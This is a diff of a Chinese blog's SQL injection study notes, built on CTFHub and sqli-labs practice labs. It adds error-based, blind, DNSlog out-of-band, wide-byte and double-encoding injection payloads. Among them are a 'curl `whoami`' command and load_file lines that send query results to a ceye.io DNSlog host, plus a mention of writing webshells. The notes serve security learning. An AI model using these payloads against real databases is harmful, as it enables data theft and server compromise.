@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SqlInjection, 0xahh的博客">
+    <meta name="keywords" content="Sql注入, 0xahh的博客">
     <meta name="description" content="技术">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SqlInjection | 0xahh的博客</title>
+    <title>Sql注入 | 0xahh的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SqlInjection</h1>
+                    <h1 class="description center-align post-title">Sql注入</h1>
                 </div>
             </div>
         </div>
@@ -467,21 +467,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-02-18
+                    2021-07-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    9k
+                    10.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    35 分
+                    39 分
                 </div>
                 
 
@@ -643,7 +643,7 @@
 </ul>
 <p><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,(select version()))</code>这里使用extractvalue（），第一个参数随便写个1，重点就是第二个参数，正常时应该使用一个字符串，这里用他来报错，这里就可以查出其version了，但注意到，这时查出的语句为：XPATH syntax error: ‘.22-MariaDB-0+deb10u1’，报错正常，但可以看到显示不全，这时候我们就需要加入一个concat函数来拼接一下，拼接0x74即一个’~’号，就可以查到了所有的信息了，</p>
 <ul>
-<li><p><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select version())))</code>这样就可以看到所有的信息了，现在就可以开始查想要的东西了，注意，现在来说我们还是只能一条一条的查，不能group_concat，还是只有一条一条的查<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))</code></p>
+<li><p><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select version())))</code>这样就可以看到所有的信息了，现在就可以开始查想要的东西了，注意，<strong>可以group_concat()</strong><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))</code></p>
 </li>
 <li><p>这样可以看到本库里的表，看到有一个flag表，查这个表，<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;flag&#39; limit 0,1)))</code>看到只有一个flag字段，那就只有这里了，查出来就行了，<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select flag from flag)))</code></p>
 </li>
@@ -656,6 +656,11 @@
 <ul>
 <li>我们也可以使用updatexml()函数，区别只是最后多一个参数，那个参数写1就行了</li>
 </ul>
+<p><strong>之前不知道怎么的，记录到时不能使用group_concat(),但其实是可以的</strong>，记录一下使用的详情，以sqlilab为例：</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;))) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以得到：</p>
+<p><img src="/images/image-20210722162921128.png"></p>
 <p>报错注入差不多就这样了</p>
 <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>什么是盲注，盲注就是在即使页面正常运行时也不会在页面上显示出数据，即使注入成功无法直接的查询到想要的数据，只能通过true or false来判断查询的单一字符是否正确。我们会通过该ascii码表来对需要的数据进行一一比对，在比对为真时就可以知道这一位的数据是我们想要的了。</p>
 <p>我们在判断时会通过真假来，这时我们需要在确认了有注入点以及判断了是哪种类型的注入后，在为假的条件后（比如?id=1为真，?id=1’）使用 or 语句的后续语句真与否来判断。后续语句就是我们想要知道的信息了，写一条语句作为分析</p>
@@ -667,6 +672,7 @@
 <li>第三个是偏移量，即一次截断多少位</li>
 </ul>
 </li>
+<li>除了substr()也有别的用于截断的函数，比如left(),right(),mid()+ord(),regexp(),也可能用到like()，可以灵活运用</li>
 </ul>
 <p><code>?id=1&#39; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema = database() limit0,1)=100#</code></p>
 <p>对语句做分析，在判断注入了以后使用#来消除报错，然后使用or语句，来进行布尔判断，括号内，可以看出我们现在在查的是当前数据库下的第一个表的名（通过limit)，而substr在判断这第一个表的名的第一个字母是否为ascii值为100的字符，如果是，则会显示true，这时我们就知道了第一个字符，然后依次试验下去，就知道了整个表名（是很繁琐以及不切实际，但原理确实是这样的，可以使用burp等自动化工具来爆破或者直接sqlmap，这里只是讲解原理）</p>
@@ -726,6 +732,35 @@ urlOpen<span class="token operator">=</span><span class="token string">'http://c
 <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>跑出来就好了，但发现跑的过程很艰辛，因为原理是时间延迟，所以如果网络不畅或者requests超时啥的会让人很头疼，可能出现一些错误的字符。。。跑了好多次。。。依旧失败了，每次都有flag结构但都会有些位出错，我选择sqlmap了。。。**<em>哈哈哈，最后一次脚本和sqlmap同时跑脚本先跑出来了，真的是网络原因，不稳定是真滴难受**</em></p>
+<h3 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h3><p>在使用布尔，时间盲注的时候回造成很大的访问量，在一些时候回触发目标网站的安全机制，造成拦截，这时可以用到dnslog注入，可以一次性的得到数据库内容，再通过对其的自动化，可以大大提高注入效率。</p>
+<p>dnslog注入的原理就是进行DNS解析时，dns服务器会记录访问信息，<strong>比如访问的域名</strong>，这些信息就可以用于DNS解析。通过Dnslog平台，可以看到这些信息，实现注入</p>
+<p>这里记录一些dnslog平台：<br><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
+<p><a target="_blank" rel="noopener" href="https://dns.咕.com/">https://dns.xn--9tr.com/</a></p>
+<p><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
+<p>通过平台给的url，在linux上使用命令curl xxx.dfaf.ceye.io，接下来即可在平台上找到相关信息,</p>
+<p>当我们输入命令</p>
+<pre class="line-numbers language-none"><code class="language-none">curl &#96;whoami&#96;.dfaf.ceye.io
+# 在linux中&#96;&#96;中的内容会被直接作为命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>再在平台中就可以看到会记录到<a target="_blank" rel="noopener" href="http://ado.dfaf.ceye.io,这里的ado就是whoami的执行内容,这里就是实现dnslog注入的基础./">http://ado.dfaf.ceye.io，这里的ado就是whoami的执行内容，这里就是实现dnslog注入的基础。</a></p>
+<p>而在MYSQL中，可以通过LOAD_FILE函数发起请求，实现dnslog注入，示例如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">select load_file(concat(&#39;\\\\&#39;,&#39;test&#39;,&#39;.ahh.dfaf.ceye.io\\abc123&#39;));
+# 请求后平台就会记录到信息：
+test.ahh.dfaf.ceye.io
+select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.ahh.dfaf.ceye.io\\abc123&#39;));
+# 这样就可以查找出database了 ，注意，select语句这里数据格式和内容有限制，比如不能有@，~等特殊字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>注意，load_file发起请求只能在window上进行，linux不行，所以目标数据库必须在windows系统上，且需要足够的系统权限，即MYSQL的my.ini配置文件中secure_file_priv需要设置,因为其默认是NULL，即不允许读取文件，将其设置为””,即可实现dnslog注入</strong></p>
+<p><img src="/images/image-20210719144639950.png"></p>
+<p>可以看到此时为空，就可以实现dnslog注入了，这里以sqlilab的时间盲注做实验：</p>
+<p><img src="/images/image-20210719151513063.png"></p>
+<p>可以在dnslog平台看到：</p>
+<p><img src="/images/image-20210719151550164.png"></p>
+<p>说明查到表了，接下来就是在select语句做更改即可</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and load_file(concat(&#39;\\\\&#39;,(select schema_name from information_schema.schemata limit 2,1),&#39;.mysql.m1j8ro.ceye.io\\aaa&#39;))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/image-20210719152145197.png"></p>
+<p>接下来的步骤不做记录，注意，每次只能查一条，也不能group_concat(),要想更快不手动更改limit可以使用对应的脚本。</p>
 <h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>就是注入点在cookie中，cookie是啥不再介绍，我们需要在cookie处进行注入，具体注入方法按照环境来决定，需要自己慢慢的尝试，也是一个经验的问题。需要多练习，以ctfhub上的cookie注入来作为例子。使用burpsuite来进行注入</p>
 <p>打开题目告诉我们注入点变了，使用burp抓包</p>
 <p>可以看到cookie：</p>
@@ -788,13 +823,24 @@ Referer: 1        #这样才对
 <p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=-1/**/union/**/select/**/1,group_concat(nalhiirshz)/**/from/**/ppaymrtivl</code></p>
 <p>得到flag，总觉得ctfhub的环境怪怪的，不能闭合还是能继续往下走<del>肯定不是我的问题</del></p>
 <h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>这里视频里是用的less-27作为环境，使用内联注释绕过失败了，<del>尴尬</del>但方法得记住，内联注释就是将被过滤掉的语句使用/*!*/包裹起来，比如如果select被过滤掉了则我们使用/*!select*/来进行包裹，可能能绕过过滤，视频里这样不知道为啥失败了，老师使用了另外两种方法，一是大小写，比如写成selEct,以及拼接，在select中再放一个select<code>selselectect</code>这样中间的完整的select被过滤掉以后外层的拼接起来就好了。<del>大概就是这样，不想实验了，累了</del></p>
-<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>什么叫宽字节：当MySQL使用GBK作为编码时会用两个字节作为汉字，有的时候网站会通过加上反斜杠来进行过滤，此时我们加单引号后不会报错，因为单引号前被加了反斜杠被转义了，这种时候尝试宽字节注入，因为反斜杠的编码时%5c，如果是GBK编码，我们在他前面加一个字符，使其成为一个GBK范围内的编码，（编码范围见百度），就“吃掉”了反斜杠，继续成功执行注入</p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>什么叫宽字节：当<strong>MySQL使用GBK</strong>作为编码时会用两个字节作为汉字，有的时候网站会通过<strong>加上反斜杠</strong>来进行过滤，此时我们加单引号后不会报错，因为单引号前被加了反斜杠被转义了，这种时候尝试宽字节注入，因为反斜杠的编码时%5c，如果是GBK编码，我们在他前面加一个字符，使其成为一个GBK范围内的编码，（编码范围见百度），就“吃掉”了反斜杠，继续成功执行注入</p>
 <p>以less-33为例子</p>
 <p><code>http://127.0.0.1:85/sqli-labs/Less-33/?id=1&#39;</code></p>
 <p>加入单引号后没有报错，页面上显示出hint：Hint: The Query String you input is escaped as : 1\‘</p>
 <p>单引号前有一个反斜杠，我们的单引号被过滤掉了，下一行hint：The Query String you input in Hex becomes : 315c27，我们输入的id=1\‘的编码时这么多，我们知道，反斜杠的编码时%5c，如果我们在其之前加入另外的编码使其成为宽字节，就可以去掉反斜杠了，查询GBK的范围，选择一个，%df，这样df5c属于宽字节，加入%df后形成的新字节被MYSQL忽视，反斜杠也没了，这样我们的单引号就又起作用了，具体语法为<code>http://127.0.0.1:85/sqli-labs/Less-33/?id=1%df&#39;</code></p>
 <p><code>http://127.0.0.1:85/sqli-labs/Less-33/?id=-1%df&#39; union select 1,2,database() %23</code></p>
 <p>这样已经成功注入了。后续不表</p>
+<p>防范：</p>
+<ul>
+<li>使用utf-8编码</li>
+<li>使用mysqlreal_escape_string.函数，同时使用mysql_set_charset(‘gbk’, $conn);即可防御</li>
+<li>可以设置参数，character_set_client= binary</li>
+</ul>
+<h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p>当php中使用了urldecode函数，且放置位置不恰当时，会和php本身的编码配合失误，造成漏洞。当我们输入?id=1’时网站加上反斜杠，但当我们使用二次编码注入就可以绕过，具体如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;%2527，通过php自身编码，%25被转译为&quot;%&quot;，此时为id&#x3D;%27,若使用了urldecode函数，%27被转译为单引号，就不会被加上反斜杠了 
+%25是&quot;%&quot;，%27是&quot;&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>黑盒测试可以使用id=%2527来测试，白盒可以先看有没有使用urldecode函数，且其使用位置是否合理</p>
 <h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>简单来说就是在一个语句后面加上分号<code>;</code>,这代表着这一条语句的结束，分号后面继续写别的语句，这样我们写的语句就会和前面的语句一起执行，比如</p>
 <p><code>select * from user where id =1;select * from data</code></p>
 <p>在id后加上一个分号，就可以继续执行下一条。</p>
@@ -873,6 +919,44 @@ flag&#123;f28974b4-511c-4c6c-9c76-296efebc02e4&#125;<span aria-hidden="true" cla
 </li>
 </ul>
 <p><strong><em>小结一下，这些都只是最最基础的，在实际的题目中会有很多的骚操作，比如过滤掉逗号，过滤掉括号，需要大量的经验和骚操作，所以任重道远，需要未来更多的实践和学习，<del>这些是人学的东西，又多又杂，淦</del>比如过滤了逗号我们使用括号吧要用的括起来。</em></strong></p>
+<h2 id="SQL注入进阶"><a href="#SQL注入进阶" class="headerlink" title="SQL注入进阶"></a>SQL注入进阶</h2><p>上述描述了部分实际使用中的sql注入的方法，现在记录进行完整的sql注入的流程和其中需要注意的地方。</p>
+<p>可以将sql注入分为三个步骤：<strong>信息收集，数据获取，提权。</strong></p>
+<ul>
+<li>信息搜集：<ul>
+<li>数据库类型<ul>
+<li>通过报错等可以找到</li>
+</ul>
+</li>
+<li>数据库版本<ul>
+<li>version(),@@version,v$version</li>
+</ul>
+</li>
+<li>数据库用户<ul>
+<li>user(),SYSTEM_USER</li>
+</ul>
+</li>
+<li>数据库权限<ul>
+<li>super_priv,IS_SRVROLEMEMBER</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>获取信息<ul>
+<li>获取库信息</li>
+<li>获取表信息</li>
+<li>获取列信息</li>
+<li>获取数据</li>
+<li>通过语句查询，或者暴力破解（access通过暴力破解来判断有哪些表）</li>
+</ul>
+</li>
+<li>提权<ul>
+<li>执行命令（比如SQLServer sa权限）</li>
+<li>读文件（读中间配置文件，读数据库配置文件）</li>
+<li>写文件（写webshell到网站目录</li>
+<li>）</li>
+</ul>
+</li>
+</ul>
 
                 
             </div>
@@ -1529,7 +1613,7 @@ flag&#123;f28974b4-511c-4c6c-9c76-296efebc02e4&#125;<span aria-hidden="true" cla
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
+            collapseDepth: Number('3'),
             headingSelector: 'h1, h2, h3, h4, h5'
         });
 
@@ -1674,7 +1758,7 @@ flag&#123;f28974b4-511c-4c6c-9c76-296efebc02e4&#125;<span aria-hidden="true" cla
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">76.8k</span>&nbsp;字
+                class="white-color">78.3k</span>&nbsp;字
             
             
             
